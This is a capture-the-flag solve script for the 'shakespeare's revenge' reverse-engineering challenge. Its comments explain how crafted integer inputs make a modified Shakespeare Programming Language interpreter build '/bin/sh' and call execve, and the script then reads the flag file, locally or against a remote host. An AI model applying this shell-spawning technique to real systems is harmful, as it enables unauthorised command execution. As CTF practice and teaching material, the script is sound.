#!/usr/bin/env python3
"""
Exploit for shakespeare's revenge (b01lers CTF 2026 rev).

The challenge runs shakespeare (modified SPL interpreter) on challenge.spl.
The SPL has a custom "Revere" instruction that performs a syscall, with args
popped from the speaker's stack. When an arg is -1 (as u32 = 0xFFFFFFFF), it
gets replaced with a pointer to a C-string built from the referenced
character's stack (Hamlet.reference = Romeo).

The challenge SPL loops through Scene II (read 2 ints + OP) and Scene III/IV/V
(add/mul/subtract: pops 2 from Romeo.stack, pushes result to Hamlet.stack),
until OP > 4 which triggers Scene VI (syscall).

Trick: We pass LARGE longs (>= 2^32) for N1, so push() splits them into TWO
u32s (hi, lo) onto Romeo.stack. Scene III/V/IV pops 2 u32s — these are N2's
hi and lo. Left over: N1's hi and lo. Per iter we leave 2 u32s on Romeo.stack.

Over 4 iterations we build "/bin/sh" on Romeo.stack and set up Hamlet.stack
to [0, 0, 0xFFFFFFFF, 59] for execve(-1, 0, 0).

"""
import sys, subprocess, os

SHAKE = "./shakespeare"
CHAL = "challenge.spl"

def inputs():
    # Per iteration: N1, N2, OP
    # Iter 1: Scene V (subtract). val_1 = hi_N2 - lo_N2 = 0.
    #   N1_1 large (push hi=0x68='h', lo=0x73='s')
    #   N2_1: hi=lo (e.g., 1), so val=0
    yield 0x68_00000073  # 446676598899
    yield 0x1_00000001   # 4294967297 (hi=1, lo=1)
    yield 4              # OP = Scene V (subtract)

    # Iter 2: Scene IV (multiply). val_2 = hi_N2 * lo_N2 = 0xFFFFFFFF = 3 * 0x55555555.
    #   N1_2 large (push hi=0x2F='/', lo=0x6E='n')
    #   N2_2 = (3<<32) | 0x55555555
    yield 0x2F_0000006E  # 201863463022
    yield 0x3_55555555   # 14316557653 (hi=3, lo=0x55555555)
    yield 3              # OP = Scene IV (multiply)

    # Iter 3: Scene V. val_3 = N1 - N2 = 59 (syscall number for execve).
    #   Both small. Romeo.stack unchanged net.
    yield 59
    yield 0
    yield 4

    # Iter 4: Scene VI (OP>4). Push path fragment.
    #   N1_4 large (hi=0x69='i', lo=0x62='b')
    #   N2_4 small (= 0x2F='/').
    yield 0x69_00000062  # 450971566178
    yield 0x2F           # 47
    yield 5              # OP = Scene VI

def build_payload():
    parts = [str(x) for x in inputs()]
    # Add padding to fill cin's readahead buffer so shell has input left
    padding = "#" * 5000
    return "\n".join(parts) + "\n" + padding + "\n" + "cat /app/flag.txt\n"

def solve_local():
    p = build_payload()
    os.chdir(os.path.dirname(os.path.abspath(__file__)))
    result = subprocess.run([SHAKE, CHAL], input=p, capture_output=True, text=True, timeout=10)
    print(result.stdout)
    print("Stderr:", result.stderr, file=sys.stderr)
    return result.stdout

if __name__ == "__main__":
    if len(sys.argv) > 1 and sys.argv[1] == "remote":
        # Use pwntools to connect to remote host
        from pwn import remote
        host = sys.argv[2] if len(sys.argv) > 2 else "localhost"
        port = int(sys.argv[3]) if len(sys.argv) > 3 else 1337
        p = remote(host, port, ssl=True)
        p.sendline(build_payload().encode())
        print(p.recvall(timeout=10).decode(errors='replace'))
    else:
        solve_local()
